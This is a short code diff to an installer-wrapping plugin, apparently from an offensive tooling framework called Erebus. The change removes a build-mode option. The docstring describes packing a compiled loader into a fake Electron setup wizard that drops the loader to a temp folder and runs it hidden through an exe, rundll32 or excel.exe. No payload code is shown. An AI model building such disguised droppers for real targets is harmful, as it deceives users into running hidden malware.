@@ -5,8 +5,6 @@ Wraps the compiled loader in ``payload/`` inside an Electron NSIS installer
 that presents a fake setup wizard. At install time the wizard copies the
 embedded loader tree to ``%TEMP%\\inst-<uuid>`` and spawns the configured
 entry point (exe / dll via rundll32 / xll via excel.exe) hidden and detached.
-
-Two build modes: In-Container (Wine) and Deferred (Erebus.Helper).
 """
 
 import pathlib
@@ -70,7 +68,6 @@ class ElectronContainerPlugin(ErebusPlugin):
         entry_format: str = "exe",
         entry_name: str = "erebus.exe",
         dll_entry: str = "DllMain",
-        build_mode: str = "In-Container (Wine)",
         file_description: str = "Setup",
         copyright_str: str = "",
         custom_icon_bytes: Optional[bytes] = None,
@@ -86,7 +83,6 @@ class ElectronContainerPlugin(ErebusPlugin):
             entry_format=entry_format,
             entry_name=entry_name,
             dll_entry=dll_entry,
-            build_mode=build_mode,
             file_description=file_description,
             copyright_str=copyright_str,
             custom_icon_bytes=custom_icon_bytes,
